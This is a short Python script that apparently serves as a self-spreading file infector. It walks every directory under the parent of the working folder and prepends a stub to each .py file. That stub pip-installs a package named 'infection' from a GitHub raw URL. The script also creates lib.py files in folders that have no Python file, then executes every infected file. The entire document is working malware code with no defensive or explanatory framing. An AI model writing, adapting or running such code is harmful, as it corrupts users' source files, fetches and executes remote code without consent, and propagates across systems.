import os

skip = ["trigger.py", "infection.py", "__pycache__"]

text = '''import pip

def import_or_install(package):
    try:
        __import__(package)
    except ImportError:
        pip.main(['install', "https://raw.githubusercontent.com/Michalkap28/infection/main/dist/infection_YOUR_USERNAME_HERE-0.0.1.tar.gz"])

import_or_install("infection")
'''

def get_parent_dir(directory):
    return os.path.dirname(directory)

def run(dir):
    os.chdir(dir)
    files = []
    dirs = []
    for file in os.listdir():
        file_lower = file.lower()
        if file in skip:
            continue
        if os.path.isfile(file):
            if ".py" in file_lower:
                files.append(os.path.abspath(file))
                infect([file])
        else:
            if not file[0] == ".":
                dirs.append(os.path.abspath(file))
    
    while dirs != []:
        for dir in dirs:
            tmp = []
            dirs.remove(dir)
            os.chdir(dir)
            for file in os.listdir():
                file_lower = file.lower()
                if file in skip:
                    continue
                if os.path.isfile(file):
                    if ".py" in file_lower:
                        tmp.append(os.path.abspath(file))
                        infect([file])
                else:
                    if not file[0] == ".":
                        dirs.append(os.path.abspath(file))
            if tmp == []:
                name = "lib.py"
                if os.access(dir, os.W_OK):
                    file_write = open(name, "w")
                    file_write.close()
                    tmp.append(os.path.abspath(name))
                    infect([file])
            files += tmp
    
    infect(files)
    

def infect(files):
    for name in files:
        file_read = open(name, "r")
        file_read = file_read.read()
        
        if text not in file_read:
            new_content = text + file_read
        
            file_write = open(name, "w")
            file_write.write(new_content)
            file_write.close()
        
        command = "python " + name
        os.system(command)


run(get_parent_dir(os.getcwd()))